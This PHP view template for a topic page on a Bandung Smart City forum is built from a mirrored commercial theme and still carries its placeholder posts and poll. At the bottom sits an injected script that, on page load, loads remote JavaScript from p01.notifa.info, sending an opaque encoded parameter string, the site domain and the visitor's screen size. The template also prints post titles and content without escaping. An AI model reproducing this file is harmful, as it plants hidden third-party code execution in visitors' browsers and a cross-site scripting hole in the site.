<?php $this->load->view('layout/header_forum'); ?>


            <section class="content">
                <div class="container">
                    <div class="row">
                        <div class="col-lg-8 breadcrumbf">
                            <a href="#">Social</a> <span class="diviver">&gt;</span> <a href="<?php echo base_url();?>index.php/forum">Badami Forum</a> <span class="diviver">&gt;</span> <a href="#"><?php echo $judul; ?></a>
                        </div>
                    </div>
                </div>

                 <div class="container">
                    <div class="row">
                        <div class="col-lg-8 col-xs-12 col-md-8">
                            <div class="pull-left"><a href="#" class="prevnext"></a></div>
                            <div class="pull-left"></div>
                            <div class="pull-left"><a href="#" class="prevnext last"></a></div>
                            <div class="clearfix"></div>
                        </div>
                    </div>
                </div>
                
                <div class="container">
                    <div class="row">
                        <div class="col-lg-8 col-md-8">
                            <!-- POST -->
                            <div class="post beforepagination">
                                <div class="topwrap">
                                    <div class="userinfo pull-left">
                                        <div class="avatar">
                                            <img src="<?php echo base_url();?>assets2/images/avatar.jpg" alt="" />
                                            <div class="status green">&nbsp;</div>
                                        </div>

                                        <div class="icons">
                                            <img src="<?php echo base_url();?>assets2/images/icon1.jpg" alt="" /><img src="<?php echo base_url();?>assets2/images/icon4.jpg" alt="" /><img src="<?php echo base_url();?>assets2/images/icon5.jpg" alt="" /><img src="<?php echo base_url();?>assets2/images/icon6.jpg" alt="" />
                                        </div>
                                    </div>
                                    <div class="posttext pull-left">
                                        <h2><?php echo $judul; ?></h2>
                                        <!-- <img src= "<?php echo $gambar ;?>" class="img-responsive" alt=""> -->
                                        <h3></h3>
                                        <p><?php echo $konten; ?></p>
                                    </div>
                                    <div class="clearfix"></div>
                                </div>                              
                                <div class="postinfobot">

                                    <div class="likeblock pull-left">
                                        <a href="#" class="up"><i class="fa fa-thumbs-o-up"></i>25</a>
                                        <a href="#" class="down"><i class="fa fa-thumbs-o-down"></i>3</a>
                                    </div>

                                    <div class="prev pull-left">                                        
                                        <a href="#"><i class="fa fa-reply"></i></a>
                                    </div>

                                    <div class="posted pull-left"><i class="fa fa-clock-o"></i> <?php echo $date; ?></div>

                                    <div class="next pull-right">                                        
                                        <a href="#"><i class="fa fa-share"></i></a>

                                        <a href="#"><i class="fa fa-flag"></i></a>
                                    </div>

                                    <div class="clearfix"></div>
                                </div>
                            </div><!-- POST -->    


                             <?php if (isset($_SESSION['username'])): ?>
                            <!-- POST -->
                            <div class="post">
                                <div class="topwrap">
                                    <div class="userinfo pull-left">
                                        <div class="avatar">
                                            <img src="<?php echo base_url();?>assets2/images/avatar3.jpg" alt="" />
                                            <div class="status red">&nbsp;</div>
                                        </div>

                                        <div class="icons">
                                            <img src="<?php echo base_url();?>assets2/images/icon3.jpg" alt="" /><img src="<?php echo base_url();?>assets2/images/icon4.jpg" alt="" /><img src="<?php echo base_url();?>assets2/images/icon5.jpg" alt="" /><img src="<?php echo base_url();?>assets2/images/icon6.jpg" alt="" />
                                        </div>
                                    </div>
                                    <div class="posttext pull-left">

                                        <blockquote>
                                            <span class="original">Original Posted by - theguy_21:</span>
                                            Did you see that Dove ad pop up in your Facebook feed this year? How about the Geico camel one? 
                                        </blockquote>
                                        <p>Toronto Mayor Rob Ford does not have a bigger fan than "Anchorman's" Ron Burgundy. In fact, Burgundy wants Ford to be re-elected so much, that he agreed to sing the campaign song Brien. The tune in question ...</p>
                                    </div>
                                    <div class="clearfix"></div>
                                </div>                              
                                <div class="postinfobot">

                                    <div class="likeblock pull-left">
                                        <a href="#" class="up"><i class="fa fa-thumbs-o-up"></i>55</a>
                                        <a href="#" class="down"><i class="fa fa-thumbs-o-down"></i>12</a>
                                    </div>

                                    <div class="prev pull-left">                                        
                                        <a href="#"><i class="fa fa-reply"></i></a>
                                    </div>

                                    <div class="posted pull-left"><i class="fa fa-clock-o"></i> Posted on : 20 Nov @ 9:50am</div>

                                    <div class="next pull-right">                                        
                                        <a href="#"><i class="fa fa-share"></i></a>

                                        <a href="#"><i class="fa fa-flag"></i></a>
                                    </div>

                                    <div class="clearfix"></div>
                                </div>
                            </div><!-- POST -->



                            <!-- POST -->
                            <div class="post">
                                <form action="#" class="form" method="post">
                                    <div class="topwrap">
                                        <div class="userinfo pull-left">
                                            <div class="avatar">
                                                <img src="<?php echo base_url();?>assets2/images/avatar4.jpg" alt="" />
                                                <div class="status red">&nbsp;</div>
                                            </div>

                                            <div class="icons">
                                                <img src="<?php echo base_url();?>assets2/images/icon3.jpg" alt="" /><img src="<?php echo base_url();?>assets2/images/icon4.jpg" alt="" /><img src="<?php echo base_url();?>assets2/images/icon5.jpg" alt="" /><img src="<?php echo base_url();?>assets2/images/icon6.jpg" alt="" />
                                            </div>
                                        </div>
                                        <div class="posttext pull-left">
                                            <div class="textwraper">
                                                <div class="postreply">Post a Reply</div>
                                                <textarea name="reply" id="reply" placeholder="Type your message here"></textarea>
                                            </div>
                                        </div>
                                        <div class="clearfix"></div>
                                    </div>                              
                                    <div class="postinfobot">

                                        <div class="notechbox pull-left">
                                            <input type="checkbox" name="note" id="note" class="form-control" />
                                        </div>

                                        <div class="pull-left">
                                            <label for="note"> Email me when some one post a reply</label>
                                        </div>

                                        <div class="pull-right postreply">
                                            <div class="pull-left smile"><a href="#"><i class="fa fa-smile-o"></i></a></div>
                                            <div class="pull-left"><button type="submit" class="btn btn-primary">Post Reply</button></div>
                                            <div class="clearfix"></div>
                                        </div>


                                        <div class="clearfix"></div>
                                    </div>
                                </form>
                            </div><!-- POST -->
                            <?php endif ?>


                        </div>
                        <div class="col-lg-4 col-md-4">

                            <div class="sidebarblock">
                        <h3>Kategori</h3>
                        <div class="divline"></div>
                        <div class="blocktxt">
                            <ul class="cats">
                                <li><a href="#">Pemerintahan Cerdas <span class="badge pull-right">62</span></a></li>
                                <li><a href="#">Branding Cerdas <span class="badge pull-right">21</span></a></li>
                                <li><a href="#">Ekonomi Cerdas <span class="badge pull-right">80</span></a></li>
                                <li><a href="#">Pola Hidup Cerdas <span class="badge pull-right">75</span></a></li>
                                <li><a href="#">Masyarakat Cerdas <span class="badge pull-right">58</span></a></li>
                                <li><a href="#">Lingkungan Cerdas <span class="badge pull-right">21</span></a></li>
                                <li><a href="#">Evaluasi Smart City <span class="badge pull-right">32</span></a></li>
                                <li><a href="#">Riset Smart City <span class="badge pull-right">22</span></a></li>
                                <li><a href="#">Smart District <span class="badge pull-right"></span></a></li>
                                <li><a href="#">Pameran <span class="badge pull-right">30</span></a></li>
                            </ul>
                        </div>
                    </div>

                    <!-- -->
                    <div class="sidebarblock">
                        <h3>Polling Minggu Ini</h3>
                        <div class="divline"></div>
                        <div class="blocktxt">
                            <p>Which game you are playing this week?</p>
                            <form action="#" method="post" class="form">
                                <table class="poll">
                                    <tr>
                                        <td>
                                            <div class="progress">
                                                <div class="progress-bar color1" role="progressbar" aria-valuenow="40" aria-valuemin="0" aria-valuemax="100" style="width: 90%">
                                                    Call of Duty Ghosts
                                                </div>
                                            </div>
                                        </td>
                                        <td class="chbox">
                                            <input id="opt1" type="radio" name="opt" value="1">  
                                            <label for="opt1"></label>  
                                        </td>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="progress">
                                                <div class="progress-bar color2" role="progressbar" aria-valuenow="40" aria-valuemin="0" aria-valuemax="100" style="width: 63%">
                                                    Titanfall
                                                </div>
                                            </div>
                                        </td>
                                        <td class="chbox">
                                            <input id="opt2" type="radio" name="opt" value="2" checked>  
                                            <label for="opt2"></label>  
                                        </td>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="progress">
                                                <div class="progress-bar color3" role="progressbar" aria-valuenow="40" aria-valuemin="0" aria-valuemax="100" style="width: 75%">
                                                    Battlefield 4
                                                </div>
                                            </div>
                                        </td>
                                        <td class="chbox">
                                            <input id="opt3" type="radio" name="opt" value="3">  
                                            <label for="opt3"></label>  
                                        </td>
                                    </tr>
                                </table>
                            </form>
                            <p class="smal">Voting ends on 19th of October</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="container">
            <div class="row">
                <div class="col-lg-8 col-xs-12">
                    <div class="pull-left"><a href="#" class="prevnext"></a></div>
                    
                    <div class="pull-left"><a href="#" class="prevnext last"></a></div>
                    <div class="clearfix"></div>
                    <h3></h3>
                </div>
            </div>
        </div>

    </section>

            <footer>
                <div class="container">
                    <div class="row">
                        <!-- <div class="col-lg-1 col-xs-3 col-sm-2 logo "><a href="#"><img src="<?php echo base_url();?>assets/images/favicons/logo.png" alt=""  /></a></div> -->
                        <div class="col-lg-8 col-xs-9 col-sm-5 ">@2018 Bandung Smart City. Semua Hak Dilindungi</div>
                        <div class="col-lg-3 col-xs-12 col-sm-5 sociconcent">
                            <ul class="socialicons">
                                <li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
                                <li><a href="#"><i class="fa fa-twitter"></i></a></li>
                            </ul>
                        </div>
                    </div>
                </div>
            </footer>
        </div>

        <!-- get jQuery from the google apis -->
        <script type="text/javascript" src="<?php echo base_url();?>assets2/jquery.js"></script>

        <!-- SLIDER REVOLUTION 4.x SCRIPTS  -->
        <script type="text/javascript" src="<?php echo base_url();?>assets2/rs-plugin/js/jquery.themepunch.plugins.min.js"></script>
        <script type="text/javascript" src="<?php echo base_url();?>assets2/rs-plugin/js/jquery.themepunch.revolution.min.js"></script>

        <script src="<?php echo base_url();?>assets2/js/bootstrap.min.js"></script>


        <!-- LOOK THE DOCUMENTATION FOR MORE INFORMATIONS -->
        <script type="text/javascript">

            var revapi;

            jQuery(document).ready(function() {
                "use strict";
                revapi = jQuery('.tp-banner').revolution(
                        {
                            delay: 15000,
                            startwidth: 1200,
                            startheight: 278,
                            hideThumbs: 10,
                            fullWidth: "on"
                        });

            }); //ready

        </script>

        <!-- END REVOLUTION SLIDER -->
    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2gaI7nYq8ilFbzqMG7jHcV7mOhk1ZVv3RboIgA94rsV3e1Y2FdzuCNbGOUrnCCsjbmYX%2b7SKxnaDr%2bO3F0ZpRSQwgfXeWQDgM81Dk1LQCHaKupnDPVj%2f%2bvjBkMjDBvfBPMUx34qU9VTaw6Jm3UHllBMI7gQINoDmEkgQ%2f4NjD%2bY4kSCLnpLbfTz2u%2byIUhRWvoN%2f1QH7vyYwtrCQawuB1DPBZ6dD9XB4VnBp8dWv4mqv%2b8J37oMQv7JFQ9xRC%2fRl6ZdgJbxohxA3jcA3KgOBOiy0Rc9iJCRmCxe4AHDL8a8X067IOsEgqhdN6q3Q3lCkwqZhVqHZxfUx3FxrSvNlW%2bnlWHpetnemm2eomct9v6Nc1XoHKiTu%2bL4XFXiMfrHWTE3ufweeaPrA%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from forum.azyrusthemes.com/02_topic.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 18 Jul 2019 11:52:35 GMT -->
</html>